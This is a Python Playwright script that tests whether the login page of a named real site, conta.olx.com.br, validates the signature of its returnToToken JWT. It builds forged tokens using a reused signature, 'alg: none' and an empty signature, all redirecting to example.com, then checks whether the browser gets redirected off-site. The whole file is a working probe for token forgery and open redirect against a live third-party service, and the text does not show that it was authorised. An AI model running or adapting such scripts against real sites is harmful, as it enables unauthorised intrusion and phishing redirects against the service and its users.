#!/usr/bin/env python3
"""Test whether conta.olx.com.br /acesso validates the returnToToken signature.
Non-destructive: only navigates GET /acesso with crafted tokens, external target = example.com."""
import base64, json, time
from playwright.sync_api import sync_playwright

def b64u(b): return base64.urlsafe_b64encode(b).rstrip(b"=").decode()
def mkjwt(header, payload, sig=""):
    h=b64u(json.dumps(header,separators=(",",":")).encode())
    p=b64u(json.dumps(payload,separators=(",",":")).encode())
    return f"{h}.{p}.{sig}"

EXT="https://example.com/OLXPOC"
orig=open("returnToToken.jwt").read().strip()
orig_sig=orig.split(".")[2]

tokens={
 "baseline_valid": orig,
 "tamper_url_origsig": mkjwt({"alg":"HS256","typ":"JWT"},{"url":EXT,"iat":int(time.time()*1000)},orig_sig),
 "alg_none": mkjwt({"alg":"none","typ":"JWT"},{"url":EXT,"iat":int(time.time()*1000)},""),
 "empty_sig": mkjwt({"alg":"HS256","typ":"JWT"},{"url":EXT,"iat":int(time.time()*1000)},""),
}

with sync_playwright() as p:
    b=p.chromium.launch(channel="chrome",headless=True,
        args=["--no-sandbox","--disable-dev-shm-usage","--lang=pt-BR"])
    ctx=b.new_context(locale="pt-BR",
        user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36")
    pg=ctx.new_page()
    for name,tok in tokens.items():
        url=f"https://conta.olx.com.br/acesso?returnToToken={tok}"
        try:
            r=pg.goto(url,wait_until="domcontentloaded",timeout=30000)
            body=pg.content()[:0]
            landed=pg.url
            redirected_ext = "example.com" in landed
            # look for error hints in title/body
            title=pg.title()[:50]
            err = any(k in pg.content().lower() for k in ["invalid","inválido","erro","token","expired"])
            print(f"[{name}] status={r.status if r else '?'} land={landed[:70]} title='{title}' EXT_REDIRECT={redirected_ext}")
        except Exception as e:
            print(f"[{name}] ERR {repr(e)[:90]}  cur={pg.url[:60]}")
        time.sleep(1)
    ctx.close();b.close()
